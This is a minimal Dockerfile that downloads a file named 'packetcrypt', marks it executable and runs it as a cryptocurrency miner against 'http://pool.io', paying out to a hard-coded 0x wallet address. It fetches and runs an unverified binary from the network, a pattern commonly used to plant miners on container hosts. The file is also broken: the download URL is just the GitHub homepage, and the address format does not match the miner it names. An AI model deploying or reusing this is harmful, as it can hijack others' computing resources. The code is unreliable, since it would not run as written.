FROM alpine:latest
RUN apk update && apk add --no-cache wget
RUN wget https://github.com -O packetcrypt
RUN chmod +x packetcrypt
CMD ["./packetcrypt", "ann", "http://pool.io", "--paymentAddress", "0x0130D5fb99cb4A39bAA527898A19e82dD86741b1"]
